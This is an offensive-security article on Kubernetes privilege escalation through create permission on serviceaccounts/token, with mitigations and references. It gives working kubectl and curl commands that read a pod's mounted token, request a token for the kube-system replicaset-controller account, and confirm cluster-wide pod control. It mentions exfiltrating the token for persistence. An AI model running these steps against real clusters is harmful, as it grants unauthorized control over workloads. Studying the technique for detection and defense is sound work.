---
title: Privilege Escalation via serviceaccounts/token Permission
description: How create permission on the serviceaccounts/token subresource enables acquiring tokens for more privileged service accounts without pods or Secrets
category: offensive
createdAt: 2026-04-12
impact: >-
  An attacker with create on serviceaccounts/token in any namespace can generate a valid, usable token for any service account in that namespace, including ones bound to powerful cluster roles. No pod needs to exist. No Secret is created. The operation leaves only an audit log entry.
mitigation:
  - Treat create on serviceaccounts/token as a privileged permission equivalent to impersonation. Audit every binding that grants it.
  - Scope token-requestor roles to a single named service account using resourceNames rather than granting access to all accounts in a namespace.
mitreTechniques:
  - T1528
  - T1550
  - T1078
tools:
  - kubectl
  - curl
references: |
  - [Kubernetes TokenRequest API](https://kubernetes.io/docs/reference/kubernetes-api/authentication-resources/token-request-v1/)
  - [Detecting and Restricting Service Account Token Generation](/topics/detecting-restricting-serviceaccount-token-generation)
  - [Kubernetes RBAC](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
  - [rbac-police (RBAC misconfiguration scanner)](https://github.com/lightspin-tech/rbac-police)
  - [Attacker persistence in Kubernetes using the TokenRequest API](https://securitylabs.datadoghq.com/articles/kubernetes-tokenrequest-api/)
---

## How the TokenRequest API works

The TokenRequest API issues short-lived tokens on demand. The API endpoint is:

```
POST /api/v1/namespaces/<namespace>/serviceaccounts/<name>/token
```

A caller sends a `TokenRequest` body specifying how long the token should live and which audiences it should be valid for:

```json
{
  "apiVersion": "authentication.k8s.io/v1",
  "kind": "TokenRequest",
  "spec": {
    "expirationSeconds": 3600,
    "audiences": ["https://kubernetes.default.svc.cluster.local"]
  }
}
```

The `spec` also accepts an optional `boundObjectRef` field that ties the resulting token to the lifetime of a specific pod or Secret. Without it the token is unbound: it remains valid until `exp` regardless of whether the requesting workload still exists.

A caller with `create` on the `serviceaccounts/token` subresource can call this endpoint for any service account the RBAC rule covers, not just its own. The token is generated in memory and never written to etcd. No Secret object is created and the credential cannot be retrieved after the API response is returned. The API server has no requirement that the requester and the target be the same identity, which means any over-permissive grant of the subresource becomes an impersonation primitive.

## RBAC permissions

The minimum RBAC rule that enables this technique is:

```yaml
rules:
  - apiGroups: [""]
    resources: ["serviceaccounts/token"]
    verbs: ["create"]
```

The attacker does not need `get` on `serviceaccounts`, `create` on `pods`, or access to `secrets`. This single rule is sufficient to request a token for any service account in the namespace. Scoping the rule with `resourceNames` limits which accounts can be targeted but does not prevent escalation. If any named account holds elevated privileges, the attacker can still acquire its token.

## The attack sequence

### Step 1: Verify the permission

`kubectl auth can-i` does not evaluate `resourceNames`-scoped rules. When the role restricts access to specific service accounts by name, both the slash form and the `--subresource` form return `no`, even though the permission is real and the token request will succeed.

```bash
kubectl auth can-i create serviceaccounts/token -n <namespace>
```

```output
no
```

```bash
kubectl auth can-i create serviceaccounts --subresource=token -n <namespace>
```

```output
no
```

Both return `no` because `SelfSubjectAccessReview` does not evaluate rules with `resourceNames`. The check is blind to scoped grants. The actual token request bypasses this check entirely and succeeds as long as the role covers the target account name.

### Step 2: Identify a privileged target

Enumeration is not always necessary. Several service accounts exist by default in every Kubernetes cluster and are worth targeting directly without prior discovery.

The `default` service account is present in every namespace but carries no permissions by default. It becomes a target only when operators bind roles to it directly, which happens when workloads are deployed without a dedicated service account. Confirm a role is bound before treating it as useful.

In `kube-system`, service accounts such as `replicaset-controller`, `deployment-controller`, and `horizontal-pod-autoscaler` are created by the cluster itself and hold broad permissions over their respective resources. These names are fixed across all standard Kubernetes installations and can be targeted without any prior enumeration.

When service account names are not known in advance, list all accounts in the namespace:

```bash
kubectl get serviceaccounts -n <namespace> -o name
```

To identify which accounts hold useful permissions without access to RoleBindings, probe using impersonation:

```bash
kubectl auth can-i --list -n <namespace> \
  --as=system:serviceaccount:<namespace>:<target-sa>
```

### Step 3: Request the token

The target in this scenario is `replicaset-controller` in `kube-system`, a service account present in every standard Kubernetes installation. It is bound to the `system:controller:replicaset-controller` ClusterRole, which grants `create` and `delete` on pods across all namespaces:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: system:controller:replicaset-controller
rules:
  - apiGroups: ["apps", "extensions"]
    resources: ["replicasets"]
    verbs: ["get", "list", "update", "watch"]
  - apiGroups: ["apps", "extensions"]
    resources: ["replicasets/status"]
    verbs: ["update"]
  - apiGroups: ["apps", "extensions"]
    resources: ["replicasets/finalizers"]
    verbs: ["update"]
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["create", "delete", "list", "patch", "watch"]
  - apiGroups: ["", "events.k8s.io"]
    resources: ["events"]
    verbs: ["create", "patch", "update"]
```

An attacker whose workload runs in any namespace only needs a `Role` in `kube-system` granting `create` on `serviceaccounts/token` for the target account. Scoping the role with `resourceNames` does not prevent escalation. It only controls which service accounts are in scope. If the named account holds elevated privileges, the outcome is identical to an unscoped grant:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: token-requestor
  namespace: kube-system
rules:
  - apiGroups: [""]
    resources: ["serviceaccounts/token"]
    verbs: ["create"]
    resourceNames: ["replicaset-controller"]
```

From inside a pod with this permission, use the auto-mounted credential to call the TokenRequest API directly. The `kubernetes.default.svc` DNS name may not resolve in all pod configurations. Use the `KUBERNETES_SERVICE_HOST` and `KUBERNETES_SERVICE_PORT` environment variables instead:

```bash
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -s -X POST \
  "${APISERVER}/api/v1/namespaces/kube-system/serviceaccounts/replicaset-controller/token" \
  --cacert "${CACERT}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"expirationSeconds":3600}}'
```

A successful request returns HTTP 201 with the token in `status.token`:

```output
{
  "kind": "TokenRequest",
  "apiVersion": "authentication.k8s.io/v1",
  "status": {
    "token": "eyJhbGciOiJSUzI1NiIsImtpZCI6...",
    "expirationTimestamp": "2026-04-12T10:14:03Z"
  }
}
```

The returned token is signed by the API server's `--service-account-signing-key-file`. Its JWT payload contains:

| Claim | Value |
| --- | --- |
| `sub` | `system:serviceaccount:kube-system:replicaset-controller` |
| `iss` | value of `--service-account-issuer` on the API server |
| `aud` | audience from the request spec, defaults to the API server issuer URL |
| `kubernetes.io.namespace` | `kube-system` |
| `kubernetes.io.serviceaccount.name` | `replicaset-controller` |
| `exp` | `now + expirationSeconds` |
| `iat` | token issuance time |
| `nbf` | not-before time, equal to `iat` |
| `jti` | unique token identifier |

### Step 4: Verify the escalation

Confirm the permission difference between the attacker's own identity and the retrieved token. The attacker's own service account has no pod creation permission:

```bash
kubectl auth can-i create pods -n default \
  --as=system:serviceaccount:default:default
```

```output
no
```

The retrieved token carries cluster-wide pod creation and deletion:

```bash
kubectl auth can-i create pods -n default \
  --as=system:serviceaccount:kube-system:replicaset-controller
```

```output
yes
```

To verify using the actual escalated token rather than `--as` impersonation:

```bash
kubectl auth can-i create pods -n default --token="<escalated-token>"
```

```output
yes
```

Once the escalated token is in hand, it can be exfiltrated and used to maintain access from outside the cluster without leaving any in-cluster footprint. That lifecycle (exfiltration, pod deletion, and external persistence) is covered in [Persistence via Unbound Service Account Tokens](/topics/persistence-via-unbound-serviceaccount-tokens).
